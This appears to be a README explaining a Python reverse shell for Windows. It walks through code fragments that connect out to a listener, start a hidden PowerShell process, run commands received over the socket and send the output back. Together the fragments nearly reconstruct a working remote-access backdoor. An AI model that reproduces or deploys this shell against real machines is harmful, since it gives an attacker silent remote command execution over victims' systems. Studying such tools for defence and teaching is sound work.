# How This Reverse Shell Works

This Python script creates a basic reverse shell using sockets and PowerShell.  
Below is a simple breakdown of how the script operates internally.

---

## 1. Connecting to the Listener

The script starts by creating a TCP socket and connecting to the IP and port specified in the code:

```python
s.connect((RHOST, RPORT))
```

This creates an outbound connection from the machine running the script to the listening machine.  
Reverse shells do this so they can talk to the listener without waiting for incoming connections.

---

## 2. Launching PowerShell in the Background

Once connected, the script starts a PowerShell process:

```python
subprocess.Popen(
    ["powershell.exe"],
    shell=True,
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)
```

This PowerShell runs silently in the background, and all input/output goes through Python instead of a visible window.

---

## 3. Receiving Commands

The script waits for commands sent by the listener:

```python
data = s.recv(1024)
```

Whatever is sent through the socket becomes a PowerShell command.

If the listener sends `exit`, the loop ends and the shell closes.

---

## 4. Executing Commands in PowerShell

The received command is written directly into PowerShell's stdin:

```python
proc.stdin.write(data)
proc.stdin.flush()
```

PowerShell executes the command as if the user typed it locally.

---

## 5. Sending Output Back

After executing the command, PowerShell's output is captured:

```python
stdout_output = proc.stdout.read(1024)
stderr_output = proc.stderr.read(1024)
```

The script then sends the output back through the socket:

```python
s.send(stdout_output + stderr_output)
```

This allows the remote listener to see the exact output of each command.

---

## Summary

In short:

1. The script connects to the listener.
2. It launches a hidden PowerShell process.
3. It receives commands through the socket.
4. PowerShell executes the commands.
5. The output is sent back to the listener.

This creates a simple interactive reverse shell.
